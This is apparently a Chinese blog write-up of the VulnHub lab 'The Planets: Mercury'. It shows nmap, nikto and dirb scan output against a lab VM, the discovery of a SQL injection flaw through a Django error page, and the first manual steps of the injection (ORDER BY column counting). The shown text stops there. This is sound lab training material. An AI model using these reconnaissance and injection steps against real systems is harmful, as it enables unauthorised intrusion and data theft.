<!DOCTYPE html><html lang="zh-CN" theme-mode="dark"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><meta name="google-site-verification" content="JleqOUPaJdGpfRPLH4e3NfODV87Fmag6pJBPvxKQKEc"><title>[vulnhub]  The Planets: Mercury | Terminal-001 | T3yT3y</title><link rel="icon" type="image/x-icon" href="/favicon.ico"><script>var config = {"root":"/","search":{"preload":false,"activeHolder":"Enter here","blurHolder":"Search","noResult":"Data \"$0\" not found"},"code":{"codeInfo":"$0 - $1 lines","copy":"copy","copyFinish":"copied","expand":"expand"}}</script><script src="/js/gitalk.js"></script><script src="//unpkg.com/mermaid@9.2.2/dist/mermaid.min.js"></script><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lightgallery.css"><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lg-zoom.css"><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lg-thumbnail.css"><link type="text/css" rel="stylesheet" href="/lib/fontawesome/brands.min.css"><link type="text/css" rel="stylesheet" href="/lib/fontawesome/fontawesome.min.css"><link rel="stylesheet" href="/css/arknights.css"><script>if (window.localStorage.getItem('theme-mode') === 'light') document.documentElement.setAttribute('theme-mode', 'light')
if (window.localStorage.getItem('theme-mode') === 'dark') document.documentElement.setAttribute('theme-mode', 'dark')</script><style>@font-face {
 font-family: BenderLight;
 src: local('Bender'), url("/font/BenderLight.ttf");
}
@font-face {
 font-family: 'JetBrains Mono';
 src: local('JetBrains Mono'), url('/font/JetBrainsMono-Regular.woff2') format('woff2');
}
@font-face {
 font-family: 'Font Awesome 6 Brands';
 src: local('Font Awesome 6 Brands'), url('/lib/fontawesome/fa-brands.woff2') format('woff2');
}
@font-face {
 font-family: 'Font Awesome 6 Free';
 src: local('Font Awesome 6 Free'), url('/lib/fontawesome/fa-regular.woff2') format('woff2');
}</style><style>:root {
  --dark-background: url('https://ak.hypergryph.com/assets/index/images/ak/pc/bk.jpg');
  --light-background: url('/img/bk.jpg');
}</style><meta name="generator" content="Hexo 6.3.0"></head><body><div class="loading" style="opacity: 0"><div class="loadingBar left"></div><div class="loadingBar right"></div></div><main><header class="closed"><nav><div class="navBtn hide"><i class="navBtnIcon"><span class="navBtnIconBar"></span><span class="navBtnIconBar"></span><span class="navBtnIconBar"></span></i></div><div class="navItem" id="search-header"><span class="navItemTitle"><input autocomplete="off" autocorrect="off" autocapitalize="none" placeholder="Search" spellcheck="false" maxlength="50" type="text" id="search-input"></span></div><div class="navItem" id="search-holder"></div><div class="search-popup"><div id="search-result"></div></div><ol class="navContent"><li class="navItem"><a class="navBlock" href="/"><span class="navItemTitle">Home</span></a></li><li class="navItem" matchdata="categories,tags"><a class="navBlock" href="/archives/"><span class="navItemTitle">Archives</span></a></li><li class="navItem"><a class="navBlock" href="/about/"><span class="navItemTitle">About</span></a></li></ol></nav></header><article><div id="post-bg"><div id="post-title"><h1>[vulnhub]  The Planets: Mercury</h1><div id="post-info"><span>First Post: <div class="control"><time datetime="2023-05-24T08:57:01.978Z" id="date"> 2023-05-24</time></div></span><br><span>Last Update: <div class="control"><time datetime="2023-05-24T13:55:06.652Z" id="updated"> 2023-05-24</time></div></span><br><span>Word Count: <div class="control">4.8k</div></span><br><span>Read Time: <div class="control">27 min</div></span></div></div><hr><div id="post-content"><p class='item-img' data-src='/pic/601c601ca7df92eef3eee22b83bcd142355143.jpg'><img src="/pic/601c601ca7df92eef3eee22b83bcd142355143.jpg" alt="601c601ca7df92eef3eee22b83bcd142355143"></p>
<span id="more"></span>

<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>主机发现，端口扫描，服务检测，TCP扫描，OS检测，漏洞扫描。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/vulnhub/mercury/workSpace]<br>└─$ sudo nmap -sn 192.168.56.0/24                                     <br>[sudo] password <span class="hljs-keyword">for</span> kali: <br>Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-23 21:21 CST<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.56.1<br>Host is up (0.00028s latency).<br>MAC Address: 0A:00:27:00:00:08 (Unknown)<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.56.100<br>Host is up (0.00011s latency).<br>MAC Address: 08:00:27:17:F0:4B (Oracle VirtualBox virtual NIC)<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.56.103<br>Host is up (0.00016s latency).<br>MAC Address: 08:00:27:80:E5:A9 (Oracle VirtualBox virtual NIC)<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.56.144<br>Host is up.<br>Nmap <span class="hljs-keyword">done</span>: 256 IP addresses (4 hosts up) scanned <span class="hljs-keyword">in</span> 6.95 seconds<br>                                                                                             <br>┌──(kali㉿kali)-[~/vulnhub/mercury/workSpace]<br>└─$ sudo nmap -p- --min-rate=10000 192.168.56.103<br>Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-23 21:22 CST<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.56.103<br>Host is up (0.00052s latency).<br>Not shown: 65533 closed tcp ports (reset)<br>PORT     STATE SERVICE<br>22/tcp   open  ssh<br>8080/tcp open  http-proxy<br>MAC Address: 08:00:27:80:E5:A9 (Oracle VirtualBox virtual NIC)<br><br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 8.87 seconds<br>                                                                                             <br>┌──(kali㉿kali)-[~/vulnhub/mercury/workSpace]<br>└─$ sudo nmap -sT -sV -sC -O -p22,8080 192.168.56.103<br>Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-23 21:23 CST<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.56.103<br>Host is up (0.00041s latency).<br><br>PORT     STATE SERVICE    VERSION<br>22/tcp   open  ssh        OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)<br>| ssh-hostkey: <br>|   3072 c824ea2a2bf13cfa169465bdc79b6c29 (RSA)<br>|   256 e808a18e7d5abc5c66164824570dfab8 (ECDSA)<br>|_  256 2f187e1054f7b917a2111d8fb330a52a (ED25519)<br>8080/tcp open  http-proxy WSGIServer/0.2 CPython/3.8.2<br>|_http-server-header: WSGIServer/0.2 CPython/3.8.2<br>|_http-title: Site doesn<span class="hljs-string">&#x27;t have a title (text/html; charset=utf-8).</span><br><span class="hljs-string">| http-robots.txt: 1 disallowed entry </span><br><span class="hljs-string">|_/</span><br><span class="hljs-string">| fingerprint-strings: </span><br><span class="hljs-string">|   FourOhFourRequest: </span><br><span class="hljs-string">|     HTTP/1.1 404 Not Found</span><br><span class="hljs-string">|     Date: Tue, 23 May 2023 13:23:21 GMT</span><br><span class="hljs-string">|     Server: WSGIServer/0.2 CPython/3.8.2</span><br><span class="hljs-string">|     Content-Type: text/html</span><br><span class="hljs-string">|     X-Frame-Options: DENY</span><br><span class="hljs-string">|     Content-Length: 2366</span><br><span class="hljs-string">|     X-Content-Type-Options: nosniff</span><br><span class="hljs-string">|     Referrer-Policy: same-origin</span><br><span class="hljs-string">|     &lt;!DOCTYPE html&gt;</span><br><span class="hljs-string">|     &lt;html lang=&quot;en&quot;&gt;</span><br><span class="hljs-string">|     &lt;head&gt;</span><br><span class="hljs-string">|     &lt;meta http-equiv=&quot;content-type&quot; content=&quot;text/html; charset=utf-8&quot;&gt;</span><br><span class="hljs-string">|     &lt;title&gt;Page not found at /nice ports,/Trinity.txt.bak&lt;/title&gt;</span><br><span class="hljs-string">|     &lt;meta name=&quot;robots&quot; content=&quot;NONE,NOARCHIVE&quot;&gt;</span><br><span class="hljs-string">|     &lt;style type=&quot;text/css&quot;&gt;</span><br><span class="hljs-string">|     html * &#123; padding:0; margin:0; &#125;</span><br><span class="hljs-string">|     body * &#123; padding:10px 20px; &#125;</span><br><span class="hljs-string">|     body * * &#123; padding:0; &#125;</span><br><span class="hljs-string">|     body &#123; font:small sans-serif; background:#eee; color:#000; &#125;</span><br><span class="hljs-string">|     body&gt;div &#123; border-bottom:1px solid #ddd; &#125;</span><br><span class="hljs-string">|     font-weight:normal; margin-bottom:.4em; &#125;</span><br><span class="hljs-string">|     span &#123; font-size:60%; color:#666; font-weight:normal; &#125;</span><br><span class="hljs-string">|     table &#123; border:none; border-collapse: collapse; width:100%; &#125;</span><br><span class="hljs-string">|     vertical-align:</span><br><span class="hljs-string">|   GetRequest, HTTPOptions: </span><br><span class="hljs-string">|     HTTP/1.1 200 OK</span><br><span class="hljs-string">|     Date: Tue, 23 May 2023 13:23:21 GMT</span><br><span class="hljs-string">|     Server: WSGIServer/0.2 CPython/3.8.2</span><br><span class="hljs-string">|     Content-Type: text/html; charset=utf-8</span><br><span class="hljs-string">|     X-Frame-Options: DENY</span><br><span class="hljs-string">|     Content-Length: 69</span><br><span class="hljs-string">|     X-Content-Type-Options: nosniff</span><br><span class="hljs-string">|     Referrer-Policy: same-origin</span><br><span class="hljs-string">|     Hello. This site is currently in development please check back later.</span><br><span class="hljs-string">|   RTSPRequest: </span><br><span class="hljs-string">|     &lt;!DOCTYPE HTML PUBLIC &quot;-//W3C//DTD HTML 4.01//EN&quot;</span><br><span class="hljs-string">|     &quot;http://www.w3.org/TR/html4/strict.dtd&quot;&gt;</span><br><span class="hljs-string">|     &lt;html&gt;</span><br><span class="hljs-string">|     &lt;head&gt;</span><br><span class="hljs-string">|     &lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html;charset=utf-8&quot;&gt;</span><br><span class="hljs-string">|     &lt;title&gt;Error response&lt;/title&gt;</span><br><span class="hljs-string">|     &lt;/head&gt;</span><br><span class="hljs-string">|     &lt;body&gt;</span><br><span class="hljs-string">|     &lt;h1&gt;Error response&lt;/h1&gt;</span><br><span class="hljs-string">|     &lt;p&gt;Error code: 400&lt;/p&gt;</span><br><span class="hljs-string">|     &lt;p&gt;Message: Bad request version (&#x27;</span>RTSP/1.0<span class="hljs-string">&#x27;).&lt;/p&gt;</span><br><span class="hljs-string">|     &lt;p&gt;Error code explanation: HTTPStatus.BAD_REQUEST - Bad request syntax or unsupported method.&lt;/p&gt;</span><br><span class="hljs-string">|     &lt;/body&gt;</span><br><span class="hljs-string">|_    &lt;/html&gt;</span><br><span class="hljs-string">1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :</span><br><span class="hljs-string">SF-Port8080-TCP:V=7.93%I=7%D=5/23%Time=646CBE4A%P=x86_64-pc-linux-gnu%r(Ge</span><br><span class="hljs-string">SF:tRequest,135,&quot;HTTP/1\.1\x20200\x20OK\r\nDate:\x20Tue,\x2023\x20May\x202</span><br><span class="hljs-string">SF:023\x2013:23:21\x20GMT\r\nServer:\x20WSGIServer/0\.2\x20CPython/3\.8\.2</span><br><span class="hljs-string">SF:\r\nContent-Type:\x20text/html;\x20charset=utf-8\r\nX-Frame-Options:\x2</span><br><span class="hljs-string">SF:0DENY\r\nContent-Length:\x2069\r\nX-Content-Type-Options:\x20nosniff\r\</span><br><span class="hljs-string">SF:nReferrer-Policy:\x20same-origin\r\n\r\nHello\.\x20This\x20site\x20is\x</span><br><span class="hljs-string">SF:20currently\x20in\x20development\x20please\x20check\x20back\x20later\.&quot;</span><br><span class="hljs-string">SF:)%r(HTTPOptions,135,&quot;HTTP/1\.1\x20200\x20OK\r\nDate:\x20Tue,\x2023\x20M</span><br><span class="hljs-string">SF:ay\x202023\x2013:23:21\x20GMT\r\nServer:\x20WSGIServer/0\.2\x20CPython/</span><br><span class="hljs-string">SF:3\.8\.2\r\nContent-Type:\x20text/html;\x20charset=utf-8\r\nX-Frame-Opti</span><br><span class="hljs-string">SF:ons:\x20DENY\r\nContent-Length:\x2069\r\nX-Content-Type-Options:\x20nos</span><br><span class="hljs-string">SF:niff\r\nReferrer-Policy:\x20same-origin\r\n\r\nHello\.\x20This\x20site\</span><br><span class="hljs-string">SF:x20is\x20currently\x20in\x20development\x20please\x20check\x20back\x20l</span><br><span class="hljs-string">SF:ater\.&quot;)%r(RTSPRequest,1F4,&quot;&lt;!DOCTYPE\x20HTML\x20PUBLIC\x20\&quot;-//W3C//DT</span><br><span class="hljs-string">SF:D\x20HTML\x204\.01//EN\&quot;\n\x20\x20\x20\x20\x20\x20\x20\x20\&quot;http://www\</span><br><span class="hljs-string">SF:.w3\.org/TR/html4/strict\.dtd\&quot;&gt;\n&lt;html&gt;\n\x20\x20\x20\x20&lt;head&gt;\n\x20\</span><br><span class="hljs-string">SF:x20\x20\x20\x20\x20\x20\x20&lt;meta\x20http-equiv=\&quot;Content-Type\&quot;\x20cont</span><br><span class="hljs-string">SF:ent=\&quot;text/html;charset=utf-8\&quot;&gt;\n\x20\x20\x20\x20\x20\x20\x20\x20&lt;titl</span><br><span class="hljs-string">SF:e&gt;Error\x20response&lt;/title&gt;\n\x20\x20\x20\x20&lt;/head&gt;\n\x20\x20\x20\x20&lt;</span><br><span class="hljs-string">SF:body&gt;\n\x20\x20\x20\x20\x20\x20\x20\x20&lt;h1&gt;Error\x20response&lt;/h1&gt;\n\x20</span><br><span class="hljs-string">SF:\x20\x20\x20\x20\x20\x20\x20&lt;p&gt;Error\x20code:\x20400&lt;/p&gt;\n\x20\x20\x20\</span><br><span class="hljs-string">SF:x20\x20\x20\x20\x20&lt;p&gt;Message:\x20Bad\x20request\x20version\x20\(&#x27;</span>RTSP/<br>SF:1\.0<span class="hljs-string">&#x27;\)\.&lt;/p&gt;\n\x20\x20\x20\x20\x20\x20\x20\x20&lt;p&gt;Error\x20code\x20expl</span><br><span class="hljs-string">SF:anation:\x20HTTPStatus\.BAD_REQUEST\x20-\x20Bad\x20request\x20syntax\x2</span><br><span class="hljs-string">SF:0or\x20unsupported\x20method\.&lt;/p&gt;\n\x20\x20\x20\x20&lt;/body&gt;\n&lt;/html&gt;\n&quot;</span><br><span class="hljs-string">SF:)%r(FourOhFourRequest,A28,&quot;HTTP/1\.1\x20404\x20Not\x20Found\r\nDate:\x2</span><br><span class="hljs-string">SF:0Tue,\x2023\x20May\x202023\x2013:23:21\x20GMT\r\nServer:\x20WSGIServer/</span><br><span class="hljs-string">SF:0\.2\x20CPython/3\.8\.2\r\nContent-Type:\x20text/html\r\nX-Frame-Option</span><br><span class="hljs-string">SF:s:\x20DENY\r\nContent-Length:\x202366\r\nX-Content-Type-Options:\x20nos</span><br><span class="hljs-string">SF:niff\r\nReferrer-Policy:\x20same-origin\r\n\r\n&lt;!DOCTYPE\x20html&gt;\n&lt;htm</span><br><span class="hljs-string">SF:l\x20lang=\&quot;en\&quot;&gt;\n&lt;head&gt;\n\x20\x20&lt;meta\x20http-equiv=\&quot;content-type\&quot;</span><br><span class="hljs-string">SF:\x20content=\&quot;text/html;\x20charset=utf-8\&quot;&gt;\n\x20\x20&lt;title&gt;Page\x20no</span><br><span class="hljs-string">SF:t\x20found\x20at\x20/nice\x20ports,/Trinity\.txt\.bak&lt;/title&gt;\n\x20\x20</span><br><span class="hljs-string">SF:&lt;meta\x20name=\&quot;robots\&quot;\x20content=\&quot;NONE,NOARCHIVE\&quot;&gt;\n\x20\x20&lt;style</span><br><span class="hljs-string">SF:\x20type=\&quot;text/css\&quot;&gt;\n\x20\x20\x20\x20html\x20\*\x20&#123;\x20padding:0;\x</span><br><span class="hljs-string">SF:20margin:0;\x20&#125;\n\x20\x20\x20\x20body\x20\*\x20&#123;\x20padding:10px\x2020</span><br><span class="hljs-string">SF:px;\x20&#125;\n\x20\x20\x20\x20body\x20\*\x20\*\x20&#123;\x20padding:0;\x20&#125;\n\x2</span><br><span class="hljs-string">SF:0\x20\x20\x20body\x20&#123;\x20font:small\x20sans-serif;\x20background:#eee;</span><br><span class="hljs-string">SF:\x20color:#000;\x20&#125;\n\x20\x20\x20\x20body&gt;div\x20&#123;\x20border-bottom:1p</span><br><span class="hljs-string">SF:x\x20solid\x20#ddd;\x20&#125;\n\x20\x20\x20\x20h1\x20&#123;\x20font-weight:normal</span><br><span class="hljs-string">SF:;\x20margin-bottom:\.4em;\x20&#125;\n\x20\x20\x20\x20h1\x20span\x20&#123;\x20font</span><br><span class="hljs-string">SF:-size:60%;\x20color:#666;\x20font-weight:normal;\x20&#125;\n\x20\x20\x20\x20</span><br><span class="hljs-string">SF:table\x20&#123;\x20border:none;\x20border-collapse:\x20collapse;\x20width:10</span><br><span class="hljs-string">SF:0%;\x20&#125;\n\x20\x20\x20\x20td,\x20th\x20&#123;\x20vertical-align:&quot;);</span><br><span class="hljs-string">MAC Address: 08:00:27:80:E5:A9 (Oracle VirtualBox virtual NIC)</span><br><span class="hljs-string">Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port</span><br><span class="hljs-string">Device type: general purpose</span><br><span class="hljs-string">Running: Linux 5.X</span><br><span class="hljs-string">OS CPE: cpe:/o:linux:linux_kernel:5</span><br><span class="hljs-string">OS details: Linux 5.0 - 5.3</span><br><span class="hljs-string">Network Distance: 1 hop</span><br><span class="hljs-string">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="hljs-string"></span><br><span class="hljs-string">OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="hljs-string">Nmap done: 1 IP address (1 host up) scanned in 100.85 seconds</span><br><span class="hljs-string">                                                                                             </span><br><span class="hljs-string">┌──(kali㉿kali)-[~/vulnhub/mercury/workSpace]</span><br><span class="hljs-string">└─$ sudo nmap --script=vuln 192.168.56.103           </span><br><span class="hljs-string">Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-23 21:29 CST</span><br><span class="hljs-string">Stats: 0:07:29 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan</span><br><span class="hljs-string">NSE Timing: About 98.48% done; ETC: 21:36 (0:00:07 remaining)</span><br><span class="hljs-string">Nmap scan report for 192.168.56.103</span><br><span class="hljs-string">Host is up (0.00026s latency).</span><br><span class="hljs-string">Not shown: 998 closed tcp ports (reset)</span><br><span class="hljs-string">PORT     STATE SERVICE</span><br><span class="hljs-string">22/tcp   open  ssh</span><br><span class="hljs-string">8080/tcp open  http-proxy</span><br><span class="hljs-string">| http-slowloris-check: </span><br><span class="hljs-string">|   VULNERABLE:</span><br><span class="hljs-string">|   Slowloris DOS attack</span><br><span class="hljs-string">|     State: LIKELY VULNERABLE</span><br><span class="hljs-string">|     IDs:  CVE:CVE-2007-6750</span><br><span class="hljs-string">|       Slowloris tries to keep many connections to the target web server open and hold</span><br><span class="hljs-string">|       them open as long as possible.  It accomplishes this by opening connections to</span><br><span class="hljs-string">|       the target web server and sending a partial request. By doing so, it starves</span><br><span class="hljs-string">|       the http server&#x27;</span>s resources causing Denial Of Service.<br>|       <br>|     Disclosure <span class="hljs-built_in">date</span>: 2009-09-17<br>|     References:<br>|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-6750<br>|_      http://ha.ckers.org/slowloris/<br>| http-enum: <br>|_  /robots.txt: Robots file<br>MAC Address: 08:00:27:80:E5:A9 (Oracle VirtualBox virtual NIC)<br><br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 522.27 seconds<br>                                                                                             <br>┌──(kali㉿kali)-[~/vulnhub/mercury/workSpace]<br>└─$ sudo nikto -h http://192.168.56.103:8080<br>- Nikto v2.5.0<br>---------------------------------------------------------------------------<br>+ Target IP:          192.168.56.103<br>+ Target Hostname:    192.168.56.103<br>+ Target Port:        8080<br>+ Start Time:         2023-05-23 21:38:54 (GMT8)<br>---------------------------------------------------------------------------<br>+ Server: WSGIServer/0.2 CPython/3.8.2<br>+ No CGI Directories found (use <span class="hljs-string">&#x27;-C all&#x27;</span> to force check all possible <span class="hljs-built_in">dirs</span>)<br>+ /SilverStream: SilverStream allows directory listing. See: https://web.archive.org/web/20011226154728/http://archives.neohapsis.com/archives/sf/pentest/2000-11/0147.html<br>+ /static/: The X-Content-Type-Options header is not <span class="hljs-built_in">set</span>. This could allow the user agent to render the content of the site <span class="hljs-keyword">in</span> a different fashion to the MIME <span class="hljs-built_in">type</span>. See: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/<br>+ 8103 requests: 0 error(s) and 2 item(s) reported on remote host<br>+ End Time:           2023-05-23 21:46:40 (GMT8) (466 seconds)<br>---------------------------------------------------------------------------<br>+ 1 host(s) tested<br></code></pre></td></tr></table></figure>
<p>只开了22和8080方法，漏扫也没什么有用结果。</p>
<p>简单做个网页目录发现</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/vulnhub/mercury/workSpace]<br>└─$ sudo dirb http://192.168.56.103:8080                                              <br>-----------------<br>DIRB v2.22    <br>By The Dark Raver<br>-----------------<br><br>START_TIME: Wed May 24 15:41:43 2023<br>URL_BASE: http://192.168.56.103:8080/<br>WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt<br><br>-----------------<br><br>GENERATED WORDS: 4612                                                          <br><br>---- Scanning URL: http://192.168.56.103:8080/ ----<br>+ http://192.168.56.103:8080/robots.txt (CODE:200|SIZE:26)                                            <br>-----------------<br>END_TIME: Wed May 24 15:42:18 2023<br>DOWNLOADED: 4612 - FOUND: 1<br></code></pre></td></tr></table></figure>
<p>只发现robots.txt，并且里面没啥有用信息。<br>再在后台挂个<code>feroxbuster +x php,txt,asp,zip</code>确保目录发现没有遗漏什么重要信息。<br>但是不能闲着啊，于是我们尝试手动发现一下，惊喜的发现404页面的错误信息给我们带来了有用信息。<br class='item-img' data-src='/pic/assets/1684916429312-9fe3196c-5297-4130-a91e-86e416d6f073.png'><img src="/pic/assets/1684916429312-9fe3196c-5297-4130-a91e-86e416d6f073.png" alt="404pg.png"><br>Django错误提示告诉我们有一个目录是mercuryfacts&#x2F;<br>那我们就看看吧<br class='item-img' data-src='/pic/assets/1684916550651-159d340f-402a-4cdf-9e91-61ecb4045637.png'><img src="/pic/assets/1684916550651-159d340f-402a-4cdf-9e91-61ecb4045637.png" alt="mercury.png"><br>底下两个连接可以看看。<br>先看看todo<br class='item-img' data-src='/pic/assets/1684916581511-7fed8ec8-55b6-43e7-adf4-7e35a5165042.png'><img src="/pic/assets/1684916581511-7fed8ec8-55b6-43e7-adf4-7e35a5165042.png" alt="todo-remain-us-something.png"><br>发现两个有用信息：认证用的表很可能是’users’；现有的mysql请求是直接用python写的不是用django写的，很有可能存在SQL注入漏洞。<br>问题是哪里有SQLi漏洞，先不急看看另一个页面。<br class='item-img' data-src='/pic/assets/1684916703972-78a63761-7ecf-4499-a530-bfee9f825a6f.png'><img src="/pic/assets/1684916703972-78a63761-7ecf-4499-a530-bfee9f825a6f.png" alt="normalpapge.png"><br>这个URL的1很像查询的参数，多半有问题，加个引号试试<br class='item-img' data-src='/pic/assets/1684916742837-3d92b737-addc-4a67-89c4-fd038415b92d.png'><img src="/pic/assets/1684916742837-3d92b737-addc-4a67-89c4-fd038415b92d.png" alt="SQLi-found.png"><br>OK，不仅有SQL注入漏洞还有很详细的错误信息。那就别客气开始吧。</p>
<h2 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h2><h3 id="Manual-SQLi"><a href="#Manual-SQLi" class="headerlink" title="Manual SQLi"></a>Manual SQLi</h3><p>先说一下手动方法。</p>
<ol>
<li>先用<code>order by</code>猜列数</li>
</ol>
<p class='item-img' data-src='/pic/assets/1684916856148-9872c623-f943-4acc-ab66-bf1afe811323.png'><img src="/pic/assets/1684916856148-9872c623-f943-4acc-ab66-bf1afe811323.png" alt="orderby-1.png"><br>真就1列？<br class='item-img' data-src='/pic/assets/1684916867116-10743213-f646-4b33-8c05-c8c7a4cbc891.png'><img src="/pic/assets/1684916867116-10743213-f646-4b33-8c05-c8c7a4cbc891.png" alt="orderby-2.png"><br>OK，真就1列。</p>
<ol start="2">
<li>列数确定了就可以<code>UNION SELECT</code>了。</li>
</ol>
